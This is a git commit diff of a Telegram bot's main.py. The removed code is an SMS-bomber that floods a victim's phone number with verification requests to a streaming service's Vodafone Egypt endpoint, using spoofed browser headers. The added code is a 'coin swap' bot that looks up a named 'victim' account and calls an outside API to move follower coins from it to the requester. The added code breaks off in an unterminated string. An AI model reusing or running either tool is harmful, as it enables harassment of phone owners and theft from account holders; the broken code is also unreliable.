cc2763eb3ab11ddf1df44b1af27f5d7d83a04ad7
Mahmoudhodammma <91755885+Mahmoudhodammma@users.noreply.github.com>
2022-01-21 17:31:36 +0200

    Update main.py

--- main.py
+++ main.py
@@ -11,76 +11,32 @@ server = Flask(__name__)
 logger = telebot.logger
 logger.setLevel(logging.DEBUG)
 @bot.message_handler(commands=["start"])
-def f(message):
-		id = message.from_user.id
-		name = message.chat.first_name
-		u = "https://t.me/pydroi_d_3/37"
-		bot.send_photo(message.chat.id,u,f"""
-- - - - - - - - - - - - - - - - - 
-- Welcome Bot Spam Vodafone 
-- Your Name : {name}
-- Your ID : {id}
-- Send Phone Number|numer spam 
-- ex:
-	01026481548364-100
-- Dev -@uufffuu""")
+def start(message):
+    bot.send_message(message.chat.id,f"<strong>Hi {message.from_user.first_name},\n== === ==\nWellcome In FiraFollower CoinSwap! \nSend Your User and vicitm User Like :\n YourUser:VicUser\n== === ==\nBy: @trprogram </strong>",parse_mode="html")
 @bot.message_handler(func=lambda m:True)
-def f(message):
-	number = message.text.split("-")[0]
-	spam = message.text.split("-")[1]
-	er = int(spam)
-	g=0
-	m=0
-	chat_id = str(message.chat.id)
-	start = bot.send_message(message.chat.id, f'Whit...')
-	for i in range(er):
-		urll = 'https://arabia.starzplay.com/api/esb/userAccount/MSISDN/verify'
-		headers = {
-	"Host": "arabia.starzplay.com",
-    "content-length": "86",
-    "sec-ch-ua": "\" Not A;Brand\";v\u003d\"99\", \"Chromium\";v\u003d\"90\", \"Google Chrome\";v\u003d\"90\"",
-    "accept": "application/json, text/javascript, */*; q\u003d0.01",
-    "x-requested-with": "XMLHttpRequest",
-    "sec-ch-ua-mobile": "?1",
-    "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; DUB-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.210 Mobile Safari/537.36",
-    "content-type": "application/x-www-form-urlencoded; charset\u003dUTF-8",
-    "origin": "https://arabia.starzplay.com",
-    "sec-fetch-site": "same-origin",
-    "sec-fetch-mode": "cors",
-    "sec-fetch-dest": "empty",
-    "referer": "https://arabia.starzplay.com/ar/partners/vodafone-egypt",
-    "accept-encoding": "gzip, deflate, br",
-    "accept-language": "en-US,en;q\u003d0.9,ar-EG;q\u003d0.8,ar;q\u003d0.7",
-    "cookie": "_gat_UA-52364929-4\u003d1"
-	}
-		data = {
-	'mobilePrefix' : '20' ,
-    'mobileNumber' :number,
-    'operator' : 'vodafoneegypt' 
-	}
-		re = requests.post(urll,headers=headers,data=data).text
-		if ("smsTransactionId") in re:
-			g+=1
-			result = f"""
-- - - - - - - - - - - - - - - -
-- Done : {g}
--
-- Bad : {m}
--
-- Number : {number}
-- - - - - - - - - - - - - - - -"""
-			bot.edit_message_text(text=result,chat_id=int(chat_id), message_id=start.message_id)
-		else:
-			m+=1
-			result = f"""
-- - - - - - - - - - - - - - - -
-- Done : {g}
--
-- Bad : {m}
--
-- Number : {number}
-- - - - - - - - - - - - - - - -"""
-			bot.edit_message_text(text=result,chat_id=int(chat_id), message_id=start.message_id)
+def so(message):
+    bot.send_message(message.chat.id,f"<strong>Wait Please! </strong>",parse_mode="html")
+    use = message.text.split(':')[0]
+    user = message.text.split(':')[1]
+    url1 = requests.get(f"https://echoar.ml/Apimedia/infon.php?user={user}").json()
+    p = url1["Info"]["account_id"]
+    bot.send_message(message.chat.id,f"<strong>Done Get Vicitim Id : {p}\nPlease Wait... </strong>",parse_mode="html")
+    coi = requests.get(f"http://51.158.83.159/api/Fira?UserID={p}&Username={use}").json()
+    if coi['status'] =="ok":
+        print(coi)
+        mes = coi['message']
+        log = """
+Done Swwaped! 
+— — — — —
+{mes}
+— — — — —
+By : @uufffuu 
+        """
+        bot.send_message(message.chat.id,f"<strong>{log}</strong>",parse_mode="html")
+    if coi['status'] == "nok":
+        bot.send_message(message.chat.id,f"<strong>Error With Swap! ✖️</strong>",parse_mode="html")
+    else:
+        bot.send_message(message.chat.id,f"<strong>Problem With Api
 @server.route(f"/{BOT_TOKEN}", methods=["POST"])
 def redirect_message():
     json_string = request.get_data().decode("utf-8")
